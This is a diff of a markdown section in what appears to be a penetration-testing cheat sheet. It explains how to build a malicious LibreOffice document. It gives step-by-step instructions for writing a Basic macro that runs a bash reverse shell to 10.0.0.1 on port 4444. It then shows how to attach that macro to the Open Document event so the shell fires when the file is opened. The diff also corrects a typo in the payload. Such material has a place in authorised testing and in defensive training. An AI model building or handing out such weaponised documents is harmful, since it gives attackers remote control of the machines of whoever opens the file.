@@ -464,54 +464,57 @@ Create Macro to Code Execution
 
 Reference: https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html
 
+
 1. Create Macro
 
 We can create a macro and embed it into a LibreOffice file, like Microsoft Excel.
 
+    a. Open one of the LibreOffice applications such as Calc, Writer.
+
+    b. Save a new empty file at first.
+
+    c. Go to Tools → Macros → Organize Macros → Basic. The BASIC Macros window opens.
+
+    d. In the window, select our new created filename in the left pane, then click New. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.
+
+    e. In the Macro editor, write our code as below. It’s an example for reverse shell. A great alternative for macro code for windows is macro-generator.py.
+
+```bash
+REM  *****  BASIC  *****
+
+Sub Main
+    Shell("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
+End Sub
 ```
-    Open one of the LibreOffice applications such as Calc, Writer.
 
-    Save a new empty file at first.
-
-    Go to Tools → Macros → Organize Macros → Basic. The BASIC Macros window opens.
-
-    In the window, select our new created filename in the left pane, then click New. Enter arbitrary module name and click OK. Macro editor (LibreOffice Basic) opens.
-
-    In the Macro editor, write our code as below. It’s an example for reverse shell.
-
-    REM  *****  BASIC  *****
-
-    Sub Main
-        Shell("bach -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
-    End Sub
-
-    Now close the editor.
+    f. Now close the editor.
 
 2. Embed the Macro to LibreOffice File.
 
-After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.
+    a. After creating a macro as above, next configure the macro to run immediately after opening this LibreOffice file.
 
-    Return to the original window on LibreOffice.
+    b. Return to the original window on LibreOffice.
 
-    Go to Tools → Macros → Organize Macros → Basic again. The BASIC Macros window opens.
+    c. Go to Tools → Macros → Organize Macros → Basic again. The BASIC Macros window opens.
 
-    Select our new created macro (module) in the left pane. For example,
-
+    d. Select our new created macro (module) in the left pane. For example,
+```
     example.odt
         - Standard
             - Module1 <- select this
+```
 
-Click Assign. The Customize window opens.
+    e. Click Assign. The Customize window opens.
 
-In Customize window, go to Events tab. Then select Open Document and click 'Macro…'. The Macro Selector window opens.
+    f. In Customize window, go to Events tab. Then select Open Document and click 'Macro…'. The Macro Selector window opens.
 
-In the Macro Selector window, select our new created macro (module), then click OK.
+    g. In the Macro Selector window, select our new created macro (module), then click OK.
 
-Now we should see the text such "Standard.Module1.Main" at the right of the Open Document. Click OK.
+    h. Now we should see the text such "Standard.Module1.Main" at the right of the Open Document. Click OK.
 
-Save this LibreOffice file again.
+    i. Save this LibreOffice file again.
 
-Finally, we’ve created the file which is executed when the file opens.
+    z. Finally, we’ve created the file which is executed when the file opens.
 ```
 
 ```bash
